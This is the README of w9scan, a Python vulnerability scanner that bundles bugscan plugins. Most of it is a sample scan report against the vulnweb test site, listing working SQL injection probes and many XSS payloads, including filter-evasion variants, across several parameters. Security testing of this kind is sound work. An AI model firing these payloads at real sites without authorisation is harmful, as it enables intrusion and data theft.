## w9scan
这款扫描器将不仅仅只能调用bugscan插件,将不断升级扫描器，结合github上各种扫描器优秀项目  
做一个完美的扫描器！

## Requirement
- require python 2.7
- 不需要安装其他第三方库
- 支持Windos/Linux  win10 Ubuntu 测试成功

## 升级记录
- 接下来要做的: WAF/CDN探测模块 子域名爆破/探测并加入扫描 bug反馈机制

- 1.4.2 加入爬虫的备份文件探测模块参考[bcrpscan](https://github.com/secfree/bcrpscan)
- 1.4.1 完成了爬虫的`信息收集`模块和`XSS`扫描模块 ，SQL注入以及XSS扫描代码参考[https://github.com/youmengxuefei/web_vul_scan](https://github.com/youmengxuefei/web_vul_scan)
- 元旦了，祝自己快乐
- 1.4.0 完成爬虫模块[单线程] 完成`sql注入`模块 包含`int注入` `字符注入` `报错查找`
- 1.3.3 解决了程序异常，去掉了老的线程池，改用了[POC-T](https://github.com/Xyntax/POC-T/blob/2.0/lib/controller/engine.py)的线程引擎
- 1.3.2 分类了exp文件夹，使整理更方便
- 1.3.1 部分插件加入了线程池，使速度更快了 添加了部分插件
- 1.3 加入线程池，使速度更快了  内置buildtwitch分析网站结构
- 1.2 加入了IP端口服务识别，对IP开放端口定向识别并破解
- 1.1 扫描器雏形，指纹识别雏形

## FAQ
- 兼容bugscan插件？  
    程序设计就是通过调用bugscan插件运行的，bugscan插件均为网上收集
- 插件内置吗？  
    内置1000+插件，不断更新中
- 感觉没有想象中的好用啊  
    倒是说说你想怎么好用呀？
- 一千多个脚本对目标站轮训？  
    先调用`www`服务的插件，由这些插件在调用其他插件`指纹识别` `端口服务识别`等。

## 免责
w9scan扫描器项目仅用于学习，禁止用于其他用途。

## 运行测试
### Linux 
![](https://github.com/boy-hack/w9scan/blob/master/images/linux1.png)
![](https://github.com/boy-hack/w9scan/blob/master/images/linux2.png)

用`w9scan`扫描 http://testphp.vulnweb.com/ 的扫描报告：
```
      [Note] php version:5.3.0 - current
      [Note] 存在crossdomain.xml文件发现漏洞...(信息) payload: http://testphp.vulnweb.com//crossdomain.xml
      [Note] http://testphp.vulnweb.com/['php']
      [Info] IP:176.28.50.165
      [Note] udp/53=>[DNS];Ver =>none
      [Note] TCP: [21, 22, 25, 80]
      [Note] 80 => [www]; Ver => [('Server', 'nginx/1.4.1'), ('X-Powered-By', 'PHP/5.3.10-1~lucid+2uwsgi2')]
21 => [ftp]; Ver => 220 ProFTPD 1.3.3e Server (ProFTPD) [176.28.50.165]
[***] Scan report:
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [Integer SQL injection] http://testphp.vulnweb.com/artists.php?artist=1 GET /artists.php?artist=1%2B1-1 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/artists.php?artist=1 GET /artists.php?artist=1/%2A%2A/and/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/artists.php?artist=1 GET /artists.php?artist=1%09and%091%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/artists.php?artist=1 GET /artists.php?artist=1%0Aand/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/artists.php?artist=1 mysql_fetch_array()GET /artists.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/artists.php?artist=1 mysql_GET /artists.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Ealert%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Eprompt%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscript%3Econfirm%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Csvg/onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cmarquee/onstart%3Dconfirm%281%29%3E/
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cbody%20onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?cat=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E
      [Hole] [Integer SQL injection] http://testphp.vulnweb.com/listproducts.php?cat=1 GET /listproducts.php?cat=1%2B1-1 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?cat=1 GET /listproducts.php?cat=1/%2A%2A/and/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?cat=1 GET /listproducts.php?cat=1%09and%091%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?cat=1 GET /listproducts.php?cat=1%0Aand/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?cat=1 mysql_fetch_array()GET /listproducts.php?cat=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?cat=1 mysql_GET /listproducts.php?cat=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?cat=1 You have an error in your SQL syntax;GET /listproducts.php?cat=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?cat=1 MySQL server version for the right syntax to useGET /listproducts.php?cat=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Ealert%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Eprompt%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscript%3Econfirm%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Csvg/onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cmarquee/onstart%3Dconfirm%281%29%3E/
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cbody%20onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/listproducts.php?artist=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E
      [Hole] [Integer SQL injection] http://testphp.vulnweb.com/listproducts.php?artist=1 GET /listproducts.php?artist=1%2B1-1 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?artist=1 GET /listproducts.php?artist=1/%2A%2A/and/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?artist=1 GET /listproducts.php?artist=1%09and%091%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/listproducts.php?artist=1 GET /listproducts.php?artist=1%0Aand/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?artist=1 mysql_fetch_array()GET /listproducts.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?artist=1 mysql_GET /listproducts.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?artist=1 You have an error in your SQL syntax;GET /listproducts.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/listproducts.php?artist=1 MySQL server version for the right syntax to useGET /listproducts.php?artist=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Integer SQL injection] http://testphp.vulnweb.com/product.php?pic=1 GET /product.php?pic=1%2B1-1 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/product.php?pic=1 GET /product.php?pic=1/%2A%2A/and/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/product.php?pic=1 GET /product.php?pic=1%09and%091%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [String SQL injection] http://testphp.vulnweb.com/product.php?pic=1 GET /product.php?pic=1%0Aand/%2A%2A/1%3B%23 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/product.php?pic=1 mysql_fetch_array()GET /product.php?pic=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Hole] [Error SQL Found MySQL database] http://testphp.vulnweb.com/product.php?pic=1 mysql_GET /product.php?pic=1%27 HTTP/1.1
Host: testphp.vulnweb.com
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
      [Note] Infomation Collect:wvs@acunetix.com
      [Note] Infomation Collect:wvs@acunetix.com
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ealert%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Eprompt%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Econfirm%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Csvg/onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cmarquee/onstart%3Dconfirm%281%29%3E/
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cbody%20onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/showimage.php?file=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Ealert%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Eprompt%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Econfirm%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Csvg/onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cmarquee/onstart%3Dconfirm%281%29%3E/
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cbody%20onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/?pp=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Ealert%281%29%3B%3C/script%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Eprompt%281%29%3B%3C/script%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Econfirm%281%29%3B%3C/script%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Csvg/onload%3Dprompt%281%29%3B%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cmarquee/onstart%3Dconfirm%281%29%3E/&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cbody%20onload%3Dprompt%281%29%3B%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E&pp=12
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cscript%3Ealert%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cscript%3Eprompt%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cscript%3Econfirm%281%29%3B%3C/script%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4%3D%22%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Csvg/onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cmarquee/onstart%3Dconfirm%281%29%3E/
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cbody%20onload%3Dprompt%281%29%3B%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cselect%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Ctextarea%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Ckeygen%20autofocus%20onfocus%3Dalert%281%29%3E
      [Hole] [XSS] http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3Cvideo%3E%3Csource%20onerror%3D%22javascript%3Aalert%281%29%22%3E
[***] Report end
```

## Useage
python w9scan.py

## Thx
- 感谢一位网友提供了部分bugscan代码
- 爬虫的SQL和XSS模块部分参考 [https://github.com/youmengxuefei/web_vul_scan](https://github.com/youmengxuefei/web_vul_scan)
- 线程控制参考 [POC-T](https://github.com/Xyntax/POC-T/blob/2.0/lib/controller/engine.py)
- 网络访问引擎 [Hackhttp](https://github.com/BugScanTeam/hackhttp/)
- 基于爬虫的备份文件查找 [bcrpscan](https://github.com/secfree/bcrpscan)